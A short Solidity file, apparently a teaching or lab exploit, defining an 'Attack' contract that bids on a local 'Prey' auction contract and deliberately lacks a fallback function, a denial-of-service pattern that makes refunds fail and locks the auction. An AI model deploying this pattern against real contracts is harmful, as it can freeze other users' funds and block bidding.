// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./Prey.sol";

contract Attack {
    Prey prey;

    constructor(address _prey) {
        prey = Prey(_prey);
    }

    function attack() public payable {
        prey.setCurrentAuctionPrice{value: msg.value}();
    }

    // No fallback function
}